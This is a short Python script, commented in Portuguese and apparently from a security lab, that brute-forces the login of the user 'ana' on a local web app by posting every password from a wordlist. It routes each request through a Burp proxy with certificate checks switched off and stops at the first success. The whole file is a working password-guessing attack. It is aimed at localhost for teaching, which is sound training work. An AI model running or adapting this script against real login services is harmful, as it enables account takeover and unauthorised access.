#!/usr/bin/env python3
"""Exemplo: forçar requests pelo Burp (lab)."""
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = "http://127.0.0.1:8002/login"
PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

if __name__ == "__main__":
    with open("../../material_bruteforce/senhas.txt", encoding="utf-8", errors="ignore") as f:
        for linha in f:
            senha = linha.strip()
            if not senha:
                continue
            r = requests.post(URL, json={"usuario": "ana", "senha": senha},
                              proxies=PROXIES, verify=False, timeout=5)
            print(f"{senha} -> {r.status_code}")
            if r.status_code == 200:
                print(f"SUCESSO: {senha}")
                break
